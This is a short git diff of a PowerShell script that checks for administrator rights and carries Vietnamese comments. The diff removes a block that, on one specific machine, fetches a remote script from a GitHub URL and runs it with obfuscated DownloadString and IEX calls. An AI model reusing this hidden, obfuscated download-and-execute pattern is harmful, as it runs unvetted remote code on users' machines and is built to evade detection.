@@ -9,12 +9,6 @@ Add-Type -AssemblyName System.Windows.Forms
 
 $skid = "skid"
 
-if ($env:USERDOMAIN -eq "DESKTOP-S4G27N7") {
-    $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/spam.ps1")
-    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-    Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
-}
-
 
 # Kiểm tra xem script có quyền quản trị không
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
